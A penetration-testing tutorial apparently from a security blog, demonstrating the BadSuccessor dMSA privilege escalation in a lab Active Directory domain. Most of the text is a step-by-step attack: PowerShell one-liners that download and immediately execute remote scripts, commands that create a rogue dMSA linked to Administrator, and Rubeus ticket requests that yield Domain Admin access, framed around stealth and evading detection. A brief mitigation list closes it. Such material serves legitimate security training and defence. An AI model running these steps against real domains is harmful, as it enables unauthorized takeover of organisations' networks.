---
title: "Abusing BadSuccessor (dMSA): Stealthy Privilege Escalation"
source_url: https://www.hackingarticles.in/abusing-badsuccessor-dmsa-stealthy-privilege-escalation/
fetched_at: 2026-09-20T07:24:55Z
license: unspecified
category: ad
---

**BadSuccessor (dMSA)** is a dangerous vulnerability in Windows Active Directory that allows attackers to achieve domain admin access through privilege escalation. By exploiting misconfigurations in domain Managed Service Accounts (dMSA), the BadSuccessor exploit provides a stealthy path to unauthorized admin access while evading detection. This makes it a critical threat to enterprise networks.

Learn how the **BadSuccessor dMSA exploit** works, its **impact on Active Directory security**, and the best **mitigation strategies** to prevent **domain admin compromise**.

### Table of Content

- **Overview the Badsuccessor dMSA Abuse**
- **Prerequisites**
- **Lab Setup**
- **Enumeration & Exploitation**
- **Mitigation**

### Overview the Badsuccessor dMSA Abuse

**BadSuccessor** is a post compromise **privilege escalation technique** that targets a new feature in **Windows Server 2025**; **Delegated Managed Service Accounts (dMSAs)**. This technique takes advantage of vulnerabilities in the **dMSA** configuration, allowing attackers to escalate their privileges within Active Directory environments after an initial compromise, potentially granting them higher-level access or control over critical systems.

In essence, it exploits:

- **Weak ACLs on Organizational Units (OUs):** Attackers with low privileges but write rights on an OU can create or modify dMSAs.
- **msDS-DelegatedMSAState and msDS-ManagedAccountPrecededByLink:** Attributes that allow linking dMSAs to privileged accounts.
- **Kerberos quirks:** Rogue dMSAs inherit the security context of the linked privileged account, allowing attackers to obtain TGTs and TGSs as Domain Admins.

This attack is particularly dangerous because it allows an attacker with minimal delegated permissions (like **write rights on an Organizational Unit (OU)**) to:

- Create a rogue dMSA
- Link it to a privileged account (e.g., Domain Admin)
- Obtain Kerberos tickets that inherit the target’s security context
- Pivot to full domain control

Unlike attacks that require password cracking or golden ticket creation, BadSuccessor is **stealthy, lives entirely within AD’s supported features**, and can often bypass detection systems.

**Note**:*It’s a powerful reminder that “harmless” delegated permissions can cascade into full domain compromise.*

### Prerequisite

- Windows Server 2019 as Active Directory that supports PKINIT
- Domain must have Active Directory Certificate Services and Certificate Authority configured.
- Kali Linux packed with tools
- Tools: Rubeus, sharpsuccessor, badsuccessor module

### Lab Setup

This guide skips building a fresh AD lab from scratch and instead assumes:

- Active Directory is deployed in local (in our case)
- Two domain users exist:
- **shivam** – an attacker-controlled low-privileged account
- **Administrator** – the high-value target account
- The attacker has **write permissions on an OU (HACKME in our case)**
- Tools like **Rubeus** and**SharpSuccessor** are available on the attacker’s machine

This mirrors **real-world post exploitation scenarios** where the attacker leverages delegated permissions already present in a production environment.

Now, we proceed with the exploitation: The **BadSuccessor** exploit starts by exploiting **dMSA misconfigurations** in **Windows Server 2025** to **create a low privileged user account**. This foothold enables attackers to escalate privileges and gain **Domain Admin** access.

#### Create a Low-Privileged User Account

net user shivam Password@1 /add /domain

This Adds a low-privileged user (shivam) to the domain, providing us with a foothold for privilege escalation.

#### Create a Writable OU (HACKME)

In ADUC:

- Right-click **local → New → Organizational Unit**

- Name it: **HACKME**
- Click **OK**

Creating an attacker controlled Organizational Unit (OU), like HACKME, allows us to manage rogue domain Managed Service Accounts (dMSAs) without affecting more secure or monitored OUs. This isolation helps us avoid detection while maintaining control and persistence in the domain.

#### Grant shivam Write Permissions on the OU

In ADUC:

Right-click **HACKME → Properties → Security → Advanced**

Add shivam and Grant: **Write permissions**

- Rights to **Create All Child Objects**

The delegated access is a crucial requirement for the BadSuccessor attack, allowing shivam to modify dMSAs.

### Enumeration & Exploitation

Now let’s begin with enumeration and exploitation

#### Load BadSuccessor and Check for Vulnerabilities

```
iex(new-object net.webclient).DownloadString("https://raw.githubusercontent.com/LuemmelSec/Pentest-Tools-Collection/refs/heads/main/tools/ActiveDirectory/BadSuccessor.ps1")
BadSuccessor -mode check -Domain ignite.local
```
This downloads the BadSuccessor PowerShell module to assess the domain for exploitable configurations, verifying if dMSA abuse is feasible based on the current AD permissions and settings.

#### Audit OU Permissions

`iex(new-object net.webclient).DownloadString("https://raw.githubusercontent.com/akamai/BadSuccessor/refs/heads/main/Get-BadSuccessorOUPermissions.ps1")`
This reconnaissance step identifies OUs where users like shivam have the necessary permissions to create or modify dMSAs, confirming the potential for the attack.

#### Exploit: Create Rogue dMSA and Link It to Administrator

BadSuccessor -mode exploit -Path "OU=HACKME,DC=ignite,DC=local" -Name "BAD_DMSA" -DelegateAdmin "shivam" -DelegateTarget "Administrator" -domain "ignite.local"

This creates a dMSA named BAD_DMSA and associates it with the Administrator account by modifying its attributes, exploiting Active Directory to treat BAD_DMSA as a successor, inheriting all Administrator privileges.

#### Attack Flow : Rogue dMSA Creation & Linking

Let’s Understand how it does:

**Attacker** (shivam)

**Step 1.** Creates OU (HACKME) & gets Write access

**HACKME OU**

**Step 2**. Creates BAD_DMSA Managed Service Account

**BAD_DMSA dMSA**

**Step 3**. Modifies attributes:

- *msDS-DelegatedMSAState → 2 (active)*
- *msDS-ManagedAccountPrecededByLink → Administrator DN*

**Active Directory**

**Step 4**. AD thinks BAD_DMSA is a legitimate successor to Administrator

**Result**: BAD_DMSA inherits Administrator privileges at Kerberos level

By abusing msDS-ManagedAccountPrecededByLink and setting msDS-DelegatedMSAState to active, BAD_DMSA$ is treated as a continuation of Administrator; enabling escalation without cracking hashes or resetting passwords.

**Note**: This step is stealthy because no password, SIDHistory, or golden ticket creation occurs just a legitimate object manipulation inside an attacker writable OU.

#### Test Access to Sensitive Resources

dir \\srv25.ignite.local\c$

**Expected**: Access Denied – This shows there’s no privileged access before escalation.

#### Finalize dMSA Link with SharpSuccessor

.\SharpSuccessor.exe add /impersonate:Administrator /path:"ou=HACKME,dc=ignite,dc=local" /account:shivam /name:BAD_DMSA

Building on the above step, SharpSuccessor automates and strengthens the link between BAD_DMSA$ and the Administrator account, solidifying the escalation pathway.

#### Request Delegation TGT with Rubeus

.\Rubeus.exe tgtdeleg /nowrap

This step allows us to obtain a delegation TGT, enabling further Kerberos requests and facilitating continued escalation.

#### Request TGT as BAD_DMSA

.\Rubeus.exe asktgt /targetuser:BAD_DMSA$ /service:krbtgt/ignite.local /opsec /dmsa /nowrap /ptt /ticket:doIFjdCCX...

Here, we requests a TGT that now includes Administrator privileges, leveraging PAC substitution to bypass standard access controls.

#### Attack Flow : Kerberos Ticket Abuse

Let’s Understand how it does:

Attacker (shivam) using BAD_DMSA

**Step 1.** Rubeus requests TGT as BAD_DMSA

Domain Controller (KDC)

**Step 2.** KDC checks BAD_DMSA’s attributes

Finds link to Administrator

Kerberos PAC

**Step 3.** PAC populated with Administrator’s SIDs & privileges

TGT Issued

**Step 4.** Attacker uses TGT to request TGS for services (e.g., CIFS)

Service (e.g., srv25.ignite.local)

**Step 5.** Grants access as Domain Admin

**Result**: Full domain control via Kerberos authentication.

Kerberos doesn’t distinguish between the original account and the dMSA successor when building the PAC. This is why TGT and TGS requests as BAD_DMSA$ now succeed for any domain resource accessible to Administrator.

This abuse also sidesteps typical monitoring solutions that detect privilege escalation via password resets or SIDHistory injection.

**Note**: This step demonstrates why Kerberos PAC inheritance is dangerous: the attacker’s TGT now effectively represents Administrator.

Then, Rubeus sends the asktgs request for CIFs.

Note how the service cifs/srv25.ignite.local is specified, and the output shows successful ticket retrieval.

#### Request Service Ticket for File Server

We use Rubeus to request a TGS (Ticket Granting Service) for CIFS access on the file server by invoking the following command:

.\Rubeus.exe asktgs /user:BAD_DMSA$ /service:cifs/srv25.ignite.local /opsec /dmsa /nowrap /ptt /ticket:doIFzDCCBigAw...

Before accessing resources, let’s inspect the delegated ticket

We use the **BAD_DMSA$** account, now with Administrator privileges, to request a TGS for CIFS access on the file server. Thanks to PAC substitution, this TGS grants Admin-level access, enabling further actions or lateral movement within the network.

After successfully obtaining a TGT for CIFS access on the file server, we now focus on acquiring a **delegated TGT**. The **ok-as-delegate** flag, which appears in the ticket, signifies that the ticket is trusted for delegation. This is a crucial development in the attack.

**Note**: The flagged TGT allows the attacker to impersonate the **Administrator** account across trusted services, enabling access to other systems without re-authenticating or cracking passwords. This step facilitates further exploitation, lateral movement, and persistence within the network.

The below screenshot shows the details of the Service Ticket (TGS) issued for cifs/srv25.ignite.local.

Key attributes:

- **Ticket Flags** : Includes forwardable, ok as delegate, and renewable, showing it’s a fully functional ticket.
- **PAC Data** : Embedded PAC lists Administrator’s SIDs and group memberships, confirming privilege inheritance.
- **Target Service** : cifs/srv25.ignite.local – meaning the ticket is scoped for CIFS file server access.

This confirms that the Kerberos session now fully impersonates Administrator. From here, we can pivot to any service in the domain

#### Confirm Domain Admin Access

dir \\srv25.ignite.local\c$

**Result:** Access to the admin only C$ share is granted. We now effectively owns the domain through Kerberos authentication.

### Mitigation

- Restrict CreateChild and WriteDACL permissions on OUs.
- Monitor changes to msDS-DelegatedMSAState and msDS-ManagedAccountPrecededByLink (Event IDs 5136, 4662).
- Regularly audit dMSA configurations and permissions with [PowerShell](https://hackingarticles.in/powershell-empire-for-pentester-mimikatz-module/) or[BloodHound](https://hackingarticles.in/active-directory-enumeration-bloodhound/) .
- Disable unused dMSA functionality in environments not requiring it.

**Author**: MD Aslam drives security excellence and mentors teams to strengthen security across products, networks, and organizations as a dynamic Information Security leader. Contact [here](https://www.linkedin.com/in/md-aslam-7b04ab144)
